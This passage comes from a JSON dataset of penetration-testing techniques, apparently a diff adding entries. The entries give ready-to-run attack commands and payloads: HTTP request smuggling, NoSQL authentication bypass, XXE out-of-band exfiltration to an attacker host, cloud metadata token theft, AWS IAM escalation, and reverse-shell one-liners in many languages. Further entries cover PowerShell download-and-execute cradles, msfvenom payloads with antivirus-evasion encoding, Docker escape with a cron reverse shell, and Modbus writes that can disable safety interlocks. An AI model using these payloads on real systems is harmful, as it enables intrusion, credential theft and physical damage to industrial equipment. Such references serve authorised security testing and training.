+    "content": "HTTP request smuggling exploits front-end/back-end disagreement on request boundaries. CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding): POST / HTTP/1.1\\r\\nHost: TARGET\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\nb\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n. TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length): POST / HTTP/1.1\\r\\nHost: TARGET\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n. In Burp Suite: disable 'Update Content-Length'; use HTTP Request Smuggler extension: right-click > Extensions > HTTP Request Smuggler > Smuggle probe. Detection: time-delay test \u2014 if request hangs for CL.TE/TE.CL it confirms the split. Impact: bypass front-end access controls, poison requests of other users, capture credentials, achieve request-to-response mapping attacks. Only works over HTTP/1.1 \u2014 force HTTP/1.1 in Burp. Tool: smuggler.py (Python), turbo-intruder for timing-precise attacks.",
+    "metadata": {
+      "category": "web",
+      "technique": "http-request-smuggling",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "nosql-injection-mongodb",
+    "content": "NoSQL injection in MongoDB \u2014 exploit JSON operator injection to bypass authentication or extract data. Authentication bypass payloads (send as JSON body): {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} \u2014 matches any username with any password. Via HTTP params: username[$ne]=invalid&password[$ne]=invalid. Other operators: {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}; {\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}. Data extraction via regex: {\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}} \u2014 binary search to extract password char by char. Extract usernames: {\"username\": {\"$regex\": \"^a\"}, \"password\": {\"$ne\": \"x\"}}. JavaScript injection (if $where is enabled): {\"$where\": \"function(){return 1==1;\"}. Time-based blind: {\"$where\": \"function(){sleep(5000);return true;\"}. Automated: nosqli tool, NoSQLMap. Burp Intruder with operator payloads for fuzzing. Header injection: User-Agent: {\"$gt\": \"\"}. Look for MongoDB errors: TypeError, MongoError, E11000. MongoDB Compass (GUI) if port 27017 is open: mongosh TARGET:27017.",
+    "metadata": {
+      "category": "web",
+      "technique": "nosql-injection-mongodb",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "prototype-pollution",
+    "content": "Prototype Pollution \u2014 JavaScript vulnerability where attacker controls Object.prototype properties. Payload patterns \u2014 URL parameters: ?__proto__[admin]=true; ?constructor[prototype][admin]=true. JSON body: {\"__proto__\": {\"admin\": true}}; {\"constructor\": {\"prototype\": {\"admin\": true}}}. Client-side exploitation leads to DOM XSS \u2014 find a gadget that reads Object.prototype.XYZ and passes it to a sink (innerHTML, eval, document.location). Server-side (Node.js) RCE via gadgets: if application uses lodash.merge, jQuery.extend deep merge \u2014 inject {\"__proto__\": {\"shell\": \"node -e 'require(child_process).exec(cmd)'\"}} with appropriate gadget. Detection: send {\"__proto__\": {\"test123\": \"polluted\"}} then check if Object.prototype.test123 === 'polluted'. Tools: DOM Invader (Burp extension) auto-finds client-side sources; PPScan for automated detection. Common libraries with gadgets: lodash (vulnerable versions), jQuery ($.extend deep), Handlebars template engine. Look for merge(), clone(), extend(), defaults() functions that recursively copy object properties.",
+    "metadata": {
+      "category": "web",
+      "technique": "prototype-pollution",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "subdomain-takeover",
+    "content": "Subdomain takeover \u2014 DNS CNAME pointing to deprovisioned third-party service. Enumerate subdomains: subfinder -d TARGET.com -o subs.txt; amass enum -d TARGET.com; findomain -t TARGET.com. Check for dangling CNAMEs: cat subs.txt | httpx -follow-redirects -status-code | grep 404. Automated detection: subzy run --targets subs.txt; subjack -w subs.txt -t 100 -timeout 30 -o results.txt -ssl; nuclei -t takeovers/ -l subs.txt; baddns -d TARGET.com. Manual check: dig SUBDOMAIN.TARGET.com CNAME \u2014 if CNAME points to github.io, S3, Heroku, Fastly, etc., check if that resource is claimed. Takeover steps: (1) Verify CNAME: dig sub.target.com CNAME; (2) Check service: curl -v http://sub.target.com \u2014 'There isn't a GitHub Pages site here' means unclaimed; (3) Register on service using exact CNAME value. Vulnerable services: GitHub Pages, AWS S3, Heroku, Fastly, Zendesk, Shopify. Impact: serve malicious content, phishing, steal cookies from parent domain, bypass CSP. fingerprints database: github.com/EdOverflow/can-i-take-over-xyz.",
+    "metadata": {
+      "category": "recon",
+      "technique": "subdomain-takeover",
+      "tool": "subzy"
+    }
+  },
+  {
+    "id": "race-condition-web",
+    "content": "Race condition exploitation in web applications (TOCTOU \u2014 Time-of-Check to Time-of-Use). Common targets: coupon/voucher single-use bypass, balance withdrawal beyond limit, concurrent user creation, registration confirmation bypass. Technique \u2014 Last-byte synchronization in Burp Suite Turbo Intruder: send all requests with body withhold last byte, then release simultaneously. Turbo Intruder script: engine.queue(target.req, gate='race1', target.req.length-1); engine.openGate('race1'). Parallel requests in Python: import concurrent.futures; concurrent.futures.ThreadPoolExecutor(max_workers=20).map(lambda _: requests.post(url, data=payload), range(20)). Detection: look for counters, balance checks, rate limits, one-time tokens \u2014 test with 20-50 parallel identical requests. Burp Suite Repeater: group tab > Send group in parallel (single-packet attack for HTTP/2). Single-packet attack (HTTP/2 multiplexing): all requests arrive in same TCP packet, processed server-side within microseconds. Outputs to watch: duplicate credits, multiple resource creation, auth tokens accepted twice. Benchmark: send 1 request first to see baseline, then burst 20-50.",
+    "metadata": {
+      "category": "web",
+      "technique": "race-condition",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "xxe-oob-exfiltration",
+    "content": "XXE Out-of-Band exfiltration for blind XXE. Host malicious DTD on attacker server (dtd.xml): <!ENTITY % file SYSTEM 'file:///etc/passwd'> <!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://ATTACKER/exfil?x=%file;\">'> %eval; %exfil;. Send XXE payload referencing external DTD: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://ATTACKER/dtd.xml'> %xxe;]><root>&xxe;</root>. FTP exfiltration (avoids HTTP restrictions with special chars): <!ENTITY % file SYSTEM 'file:///etc/passwd'> <!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"ftp://ATTACKER:2121/%file;\">'> %eval; %exfil; \u2014 start FTP listener: nc -lvp 2121. Error-based XXE: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> <!ENTITY % err '<!ENTITY &#x25; err2 SYSTEM \"file:///%xxe;\">'>  %err; %err2;]>. Base64 encode large files: SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'. OOB DNS confirm: <!ENTITY xxe SYSTEM 'http://BURP_COLLAB/'> \u2014 use Burp Collaborator. Tools: Interactsh (open source collaborator alternative). Check for XXE: inject <!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://COLLAB/'>]><root>&xxe;</root> in XML fields.",
+    "metadata": {
+      "category": "web",
+      "technique": "xxe-oob-exfiltration",
+      "tool": "burpsuite"
+    }
+  },
+  {
+    "id": "azure-imds-exploitation",
+    "content": "Azure Instance Metadata Service (IMDS) exploitation from compromised VM or via SSRF. Endpoint: http://169.254.169.254/metadata/ \u2014 requires header 'Metadata: true' (no authentication). Get access token for managed identity: curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | jq. Token response contains access_token, expires_in, token_type. Use token to enumerate subscription: curl -H 'Authorization: Bearer TOKEN' 'https://management.azure.com/subscriptions?api-version=2020-01-01'. Get VM info: curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | jq. Get subscription ID: curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text'. Tools: MicroBurst (PowerShell), ROADtools, AADInternals. Via SSRF: if web app fetches URLs, try SSRF to http://169.254.169.254/metadata/identity/oauth2/token... with Metadata: true header (requires CRLF injection in many SSRF scenarios). Impact: token gives Azure API access as the VM's managed identity \u2014 can escalate to subscription owner if identity has broad perms.",
+    "metadata": {
+      "category": "cloud",
+      "technique": "azure-imds-exploitation",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "gcp-metadata-exploitation",
+    "content": "GCP Instance Metadata Service exploitation. Endpoint: http://metadata.google.internal/ or http://169.254.169.254/ \u2014 requires header 'Metadata-Flavor: Google'. Get all metadata: curl 'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json' -H 'Metadata-Flavor: Google'. Get service account access token: curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'. Get service account email: curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' -H 'Metadata-Flavor: Google'. Get SSH keys: curl 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys' -H 'Metadata-Flavor: Google'. Get project ID: curl 'http://metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'. Via SSRF: inject SSRF to http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token with required header (CRLF injection may be needed). Use token with gcloud: gcloud auth activate-service-account --access-token=TOKEN or with curl to Google APIs. Enumerate GCP resources: gcloud projects list; gcloud compute instances list; gcloud storage buckets list.",
+    "metadata": {
+      "category": "cloud",
+      "technique": "gcp-metadata-exploitation",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "aws-s3-bucket-misconfig",
+    "content": "AWS S3 bucket misconfiguration enumeration and exploitation. Find buckets: check HTML source, JS files, error messages for s3.amazonaws.com or BUCKET.s3.REGION.amazonaws.com. Tools: cloud_enum, S3enum, lazys3. Enumerate without credentials: aws s3 ls s3://BUCKET-NAME --no-sign-request; aws s3api list-objects-v2 --bucket BUCKET-NAME --no-sign-request. Check ACL: aws s3api get-bucket-acl --bucket BUCKET-NAME --no-sign-request. Check policy: aws s3api get-bucket-policy --bucket BUCKET-NAME --no-sign-request. Download files: aws s3 cp s3://BUCKET/file.txt . --no-sign-request; aws s3 sync s3://BUCKET /tmp/loot --no-sign-request. Upload (write access): aws s3 cp shell.php s3://BUCKET/shell.php --no-sign-request. Check versioning: aws s3api get-bucket-versioning --bucket BUCKET-NAME --no-sign-request \u2014 older versions may contain deleted secrets. Common misconfigs: public read (any object readable), public write (anyone can upload), public ACL (grantee AllUsers has READ or WRITE). Impact: data exfil, malicious file injection into app, supply-chain if bucket serves JS.",
+    "metadata": {
+      "category": "cloud",
+      "technique": "s3-misconfiguration",
+      "tool": "awscli"
+    }
+  },
+  {
+    "id": "aws-iam-privesc",
+    "content": "AWS IAM privilege escalation techniques. Enumerate permissions: aws iam get-user; aws iam list-attached-user-policies --user-name USER; aws iam list-user-policies --user-name USER; aws sts get-caller-identity. Key privesc paths: (1) iam:CreatePolicyVersion \u2014 overwrite managed policy with AdministratorAccess; (2) iam:AttachRolePolicy \u2014 attach AdministratorAccess to role you can assume: aws iam attach-role-policy --role-name ROLE --policy-arn arn:aws:iam::aws:policy/AdministratorAccess; (3) iam:PutUserPolicy \u2014 add inline policy to self; (4) iam:CreateAccessKey \u2014 create new key for existing admin user; (5) iam:PassRole + ec2:RunInstances \u2014 launch EC2 with admin role attached, pull metadata token; (6) sts:AssumeRole \u2014 assume higher-privileged role if trust policy allows. Tools: Pacu (pacu --modules iam__privesc_scan), PMapper (python3 -m principalmapper graph --account ACCOUNT, then python3 -m principalmapper query 'who can do iam:*'), CloudFox, ScoutSuite. Check if you can assume roles: aws sts assume-role --role-arn ROLE_ARN --role-session-name test. SSRF to EC2 metadata to steal IAM role credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME.",
+    "metadata": {
+      "category": "cloud",
+      "technique": "aws-iam-privesc",
+      "tool": "pacu"
+    }
+  },
+  {
+    "id": "google-dorks-pentest",
+    "content": "Google dork operators for penetration testing OSINT. Basic operators: site:target.com (restrict to domain), filetype:pdf/sql/env/log/bak/xlsx (specific file types), inurl:admin/login/config/backup (URL contains term), intitle:'index of' (directory listings), intext:'password' (body text search), cache:URL (cached version). High-value dork combos: site:target.com filetype:sql \u2014 database dumps; site:target.com filetype:env \u2014 .env files with API keys; intitle:'index of' inurl:backup \u2014 backup directories; inurl:/phpinfo.php site:target.com \u2014 PHP info pages; inurl:/admin/login site:target.com \u2014 admin panels; site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora \u2014 config files; site:pastebin.com target.com password \u2014 leaked creds on pastebin; site:github.com target.com api_key \u2014 GitHub leaks; intitle:'Tomcat' inurl:8080 \u2014 exposed Tomcat; 'Index of' inurl:ftp target.com \u2014 FTP indexes; inurl:/wp-admin site:target.com \u2014 WordPress admin; site:target.com filetype:log inurl:access \u2014 access logs. GHDB (Google Hacking Database): exploit-db.com/google-hacking-database \u2014 categorized dorks for specific vulnerabilities.",
+    "metadata": {
+      "category": "osint",
+      "technique": "google-dorking",
+      "tool": "google"
+    }
+  },
+  {
+    "id": "shodan-dorks-pentest",
+    "content": "Shodan search queries for penetration testing reconnaissance. Basic syntax: hostname:target.com; org:'Organization Name'; net:192.168.0.0/24; port:8080; product:'Apache'; version:'2.4.7'; os:'Windows'; country:'US'. CVE-based queries: vuln:CVE-2014-0160 (Heartbleed); vuln:CVE-2019-19781 (Citrix); vuln:CVE-2021-44228 (Log4Shell); vuln:CVE-2017-0144 country:DE (EternalBlue Germany). Exposed services: port:27017 mongodb (MongoDB no-auth); port:9200 elasticsearch (Elasticsearch); port:6379 redis (Redis); port:5900 'RFB 003.003' (VNC no-auth); port:23 telnet default (Telnet); port:11211 memcached stats (Memcached). ICS/SCADA: port:502 modbus (Modbus); port:47808 bacnet (BACnet); product:Siemens; product:'Schneider Electric'. Default creds: 'default password'; http.title:'SCADA'; http.title:'admin' port:80. Shodan CLI: shodan search --fields ip_str,port,org 'product:Redis'; shodan host TARGET_IP. Shodan API key required for most queries. shodan count PORT:6379 \u2014 shows exposed count. Filters: has_screenshot:true (for visual recon).",
+    "metadata": {
+      "category": "osint",
+      "technique": "shodan-dorking",
+      "tool": "shodan"
+    }
+  },
+  {
+    "id": "github-secret-scanning",
+    "content": "GitHub secret scanning and dorking. GitHub search dorks: site:github.com TARGET password; site:github.com TARGET api_key; site:github.com TARGET secret OR token OR credential. GitHub Advanced Search at github.com/search: org:TARGET filename:.env; org:TARGET filename:config.json; org:TARGET AWS_ACCESS_KEY; org:TARGET 'BEGIN RSA PRIVATE KEY'. Tool \u2014 TruffleHog (detects 800+ secret types with live verification): trufflehog git https://github.com/org/repo --only-verified; trufflehog github --org=ORGNAME --token=GITHUB_TOKEN; trufflehog filesystem /path/to/repo --json. Tool \u2014 Gitleaks (fast, CI/CD integration): gitleaks git --repo-url https://github.com/org/repo; gitleaks dir /path/to/code; gitleaks detect --source . (current dir). Scan historical commits: gitleaks git --repo-url URL --log-opts='--all'. TruffleHog verifies secrets against live APIs \u2014 AWS keys, GitHub tokens, Slack webhooks. Check public commits for sensitive patterns: (?i)(password|passwd|pwd|secret|api_key|apikey|token|access_key)[\\s]*[=:][\\s]*[^\\s]+. Use gh CLI: gh search repos TARGET --limit 100.",
+    "metadata": {
+      "category": "osint",
+      "technique": "github-secret-scanning",
+      "tool": "trufflehog"
+    }
+  },
+  {
+    "id": "wayback-gau-endpoint-discovery",
+    "content": "Wayback Machine and gau for historical endpoint discovery. gau (GetAllUrls) fetches URLs from Wayback Machine, AlienVault OTX, Common Crawl, URLScan: gau TARGET.com --o urls.txt; gau TARGET.com --providers wayback,commoncrawl,otx,urlscan --o urls.txt; gau TARGET.com --blacklist png,jpg,gif,css,svg. Filter for interesting endpoints: gau TARGET.com | grep -E '\\.(php|asp|aspx|jsp|json|xml|env|sql|bak|zip)$'. Find parameters: gau TARGET.com | grep '?' | sort -u | uro. Waybackurls: echo TARGET.com | waybackurls | tee wayback_urls.txt. Feed to nuclei: gau TARGET.com | nuclei -t exposures/. Extract JS files: gau TARGET.com | grep '\\.js$' | httpx -follow-redirects -silent. Use with gf patterns: gau TARGET.com | gf sqli | sqlmap --batch. Find forgotten endpoints: look for /admin, /api/v1, /internal, /debug, /staging in results. ParamSpider for parameter extraction: python3 paramspider.py -d TARGET.com. Pipeline: subfinder -d TARGET.com | httpx -silent | gau | gf xss | dalfox pipe \u2014 end-to-end XSS discovery. Historical creds: search gau output for /reset-password?token=, /confirm?code=.",
+    "metadata": {
+      "category": "recon",
+      "technique": "wayback-endpoint-discovery",
+      "tool": "gau"
+    }
+  },
+  {
+    "id": "can-bus-exploitation",
+    "content": "CAN bus exploitation for automotive penetration testing. Physical access via OBD-II port (under dashboard) or direct to CAN wires. Setup: connect CAN adapter (Kvaser, PEAK, USB2CAN) to Linux; load kernel module: modprobe can; modprobe can_raw; modprobe vcan; ip link set can0 up type can bitrate 500000; ip link set can0 up. Monitor traffic: candump can0 (real-time CAN frames); candump -l can0 (log to file for replay). Replay: canplayer -I logfile.log. Send frames: cansend can0 7DF#0201050000000000 (OBD-II request for engine coolant temp). Fuzzing: cangen can0 -g 1 -I 7DF -L 8 -D i (random data to arbitration ID 0x7DF). Analysis: cansniffer can0 (show changing bytes). Virtual testing: modprobe vcan; ip link add dev vcan0 type vcan; ip link set up vcan0; cansend vcan0 123#DEADBEEF. ICSim (Instrument Cluster Simulator): ./icsim vcan0 & ./controls vcan0. UDS on CAN: use isotprecv/isotpsend for ISO 15765-2 transport layer; diagnostic request: cansend can0 7DF#02190902 (request all DTCs). Reverse engineer: capture normal traffic, identify control messages by noting which IDs change state.",
+    "metadata": {
+      "category": "automotive",
+      "technique": "can-bus-exploitation",
+      "tool": "can-utils"
+    }
+  },
+  {
+    "id": "uds-protocol-exploitation",
+    "content": "UDS (Unified Diagnostic Services / ISO 14229) exploitation on automotive ECUs. UDS runs over CAN (ISO-TP), DoIP (UDP/TCP), or LIN. Common service IDs (SIDs): 0x10 \u2014 DiagnosticSessionControl (switch to extended/programming session); 0x11 \u2014 ECUReset; 0x14 \u2014 ClearDiagnosticInformation; 0x19 \u2014 ReadDTCInformation; 0x22 \u2014 ReadDataByIdentifier; 0x27 \u2014 SecurityAccess (challenge-response for unlocking); 0x2E \u2014 WriteDataByIdentifier; 0x31 \u2014 RoutineControl; 0x34/0x35/0x36/0x37 \u2014 RequestDownload/Upload/Transfer (firmware flashing). Switch to extended session: cansend can0 7DF#0210030000000000 (0x10=DiagnosticSessionControl, 0x03=extendedDiagnosticSession). Read VIN (DID 0xF190): cansend can0 7DF#0322F19000000000. SecurityAccess: send 0x2701 to request seed, receive seed, compute key using OEM algorithm, send 0x2702 + key. Tools: python-can, caringcaribou (automotive security testing framework), UDSim, Scapy automotive extensions. Brute force security access seeds (if weak algorithm). Memory read via 0x23 ReadMemoryByAddress for firmware extraction.",
+    "metadata": {
+      "category": "automotive",
+      "technique": "uds-protocol-exploitation",
+      "tool": "caringcaribou"
+    }
+  },
+  {
+    "id": "modbus-exploitation",
+    "content": "Modbus exploitation in ICS/SCADA environments. Default port 502/TCP (Modbus TCP) \u2014 no authentication, no encryption. Scan: nmap -sV -p 502 TARGET --script modbus-discover. Read coils/registers: modbus-cli TARGET read_coils 0 100 (read 100 coils starting at 0); modbus-cli TARGET read_holding_registers 0 50. Write to registers: modbus-cli TARGET write_register 0 999 (set register 0 to value 999); modbus-cli TARGET write_coil 0 true (activate coil 0). Metasploit: use auxiliary/scanner/scada/modbusdetect; use auxiliary/scanner/scada/modbus_findunitid; use auxiliary/scanner/scada/modbusclient. modbusclient options: set ACTION READ_COILS; set DATA_ADDRESS 0; set NUMBER 1; set UNIT_NUMBER 1; run. Write to toggle physical output: set ACTION WRITE_COIL; set DATA_ADDRESS 0; set DATA_TO_WRITE 1. PLCScan: python plcscan.py TARGET. Shodan dork: port:502. Attack impact: modify process values, disable safety interlocks, cause physical damage to equipment. Unit IDs 1-247 address specific slave devices \u2014 enumerate with modbus_findunitid. Cleartext: Wireshark decode_as \u2192 TCP port 502 \u2192 Modbus.",
+    "metadata": {
+      "category": "automotive",
+      "technique": "modbus-exploitation",
+      "tool": "modbus-cli"
+    }
+  },
+  {
+    "id": "php-python-reverse-shells",
+    "content": "Reverse shell one-liners for common scenarios. PHP: php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'; PHP webshell: <?php system($_GET['cmd']); ?>; <?php passthru($_REQUEST['cmd']); ?>; <?php echo shell_exec($_GET['e'].'2>&1'); ?>. Python3: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'. Perl: perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'. Ruby: ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ATTACKER\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'. Bash: bash -i >& /dev/tcp/ATTACKER/4444 0>&1; or 0<&196;exec 196<>/dev/tcp/ATTACKER/4444; sh <&196 >&196 2>&196. Netcat variants: nc -e /bin/sh ATTACKER 4444; nc ATTACKER 4444 | /bin/sh | nc ATTACKER 4445 (relay). Java JSP: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>. Use revshells.com for URL-encoded/base64 versions.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "reverse-shells",
+      "tool": "netcat"
+    }
+  },
+  {
+    "id": "powershell-reverse-shell",
+    "content": "PowerShell reverse shell payloads. Basic: powershell -nop -noexit -ep bypass -c '$client=New-Object System.Net.Sockets.TCPClient(\"ATTACKER\",4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+($ExecutionContext.SessionState.Path.CurrentLocation.Path)+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'. Base64-encoded one-liner: powershell -enc BASE64_ENCODED_PAYLOAD. Encode in Linux: echo 'PAYLOAD' | iconv -t UTF-16LE | base64 -w 0. Nishang Invoke-PowerShellTcp: IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER -Port 4444. Download cradle variations: IEX(IWR 'http://ATTACKER/shell.ps1' -UseBasicParsing); (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')|IEX. Bypass execution policy: Set-ExecutionPolicy Bypass -Scope Process; powershell -ExecutionPolicy Bypass -File shell.ps1. Catch with: nc -lvnp 4444.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "powershell-reverse-shell",
+      "tool": "powershell"
+    }
+  },
+  {
+    "id": "msfvenom-payload-generation",
+    "content": "Msfvenom payload generation for common targets. Windows x64 reverse shell EXE: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe. Windows Meterpreter staged: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o meter.exe. Windows DLL: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o shell.dll. Linux x64 ELF: msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf; chmod +x shell.elf. Java WAR (Tomcat): msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war. JSP webshell: msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.jsp. ASP.NET: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f aspx -o shell.aspx. PHP: msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php. Android APK: msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f apk -o app.apk. Python: msfvenom -p python/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.py. Encode to evade AV: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe. List payloads: msfvenom -l payloads | grep linux. Catch: use multi/handler; set payload matching payload type; set LHOST/LPORT; run.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "payload-generation",
+      "tool": "msfvenom"
+    }
+  },
+  {
+    "id": "socat-reverse-shell-pty",
+    "content": "Socat for fully interactive PTY reverse shells. Standard netcat shells lack job control, tab completion, and CTRL+C. Socat provides full TTY. Attacker listener: socat file:`tty`,raw,echo=0 tcp-listen:4444. Target (if socat available): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444. Download static socat binary to target if not installed: wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444. If socat not available on target, upgrade with Python: python3 -c 'import pty;pty.spawn(\"/bin/bash\")' then Ctrl+Z, stty raw -echo, fg, export TERM=xterm; export SHELL=bash; stty rows 38 cols 116. Socat encrypted channel: socat openssl-listen:4444,cert=cert.pem,verify=0 file:`tty`,raw,echo=0 (attacker); socat openssl:ATTACKER:4444,verify=0 exec:'bash -li',pty (target). Full options breakdown: exec \u2014 program; pty \u2014 allocate PTY; stderr \u2014 redirect stderr; setsid \u2014 new session; sigint \u2014 forward SIGINT; sane \u2014 reset terminal settings.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "socat-pty-shell",
+      "tool": "socat"
+    }
+  },
+  {
+    "id": "docker-socket-escape",
+    "content": "Docker socket /var/run/docker.sock privilege escalation. Check: ls -la /var/run/docker.sock; groups (look for 'docker' group membership). If writable, access = root on host. Mount host filesystem: docker run -it --rm -v /:/host alpine chroot /host sh \u2014 full root shell with host filesystem mounted at /. Add SSH key: docker run --rm -v /root/.ssh:/mnt alpine sh -c 'echo ATTACKER_PUBKEY >> /mnt/authorized_keys'. Add new root user: docker run --rm -v /etc:/mnt alpine sh -c 'echo \"hacker:x:0:0::/root:/bin/bash\" >> /mnt/passwd; echo \"hacker:\\$6\\$HASH:0:0:99999:7:::\" >> /mnt/shadow'. Container escape with --privileged: if already inside container \u2014 docker run --rm -it --privileged alpine (can escape to host via /dev/sda mount). Write crontab: docker run --rm -v /var/spool/cron:/mnt alpine sh -c 'echo \"* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1\" >> /mnt/crontabs/root'. GTFObins docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh. Check: docker ps; docker images \u2014 enumerate existing containers.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "docker-socket-escape",
+      "tool": "docker"
+    }
+  },
+  {
+    "id": "linux-capabilities-privesc",
+    "content": "Linux capabilities privilege escalation. Enumerate: getcap -r / 2>/dev/null \u2014 finds all binaries with capabilities set. Key dangerous capabilities: cap_setuid \u2014 set any UID (become root). cap_sys_admin \u2014 many ops including mounting, namespaces. cap_net_raw \u2014 raw packet sockets (traffic sniffing/injection). cap_dac_override \u2014 bypass file permission checks. cap_sys_ptrace \u2014 trace processes (dump memory). cap_fowner \u2014 bypass owner permission checks. Exploitation examples: Python3 with cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'. Node.js with cap_setuid: node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0,1,2]})'. Perl with cap_setuid: perl -e 'use POSIX; setuid(0); exec(\"/bin/bash\")'. OpenSSL with cap_net_bind_service + cap_setuid: possible RCE chain. Vim with cap_dac_override: vim /etc/sudoers and add privileges. Ruby: ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'. GTFObins lists capability abuse for each binary. GDB with cap_sys_ptrace: attach to SUID process and inject shellcode. Set capability (requires root): setcap cap_setuid+ep /usr/bin/python3.",
+    "metadata": {
+      "category": "privesc",
+      "technique": "capabilities-privesc",
+      "tool": "getcap"
+    }
+  },
+  {
+    "id": "ld-preload-privesc",
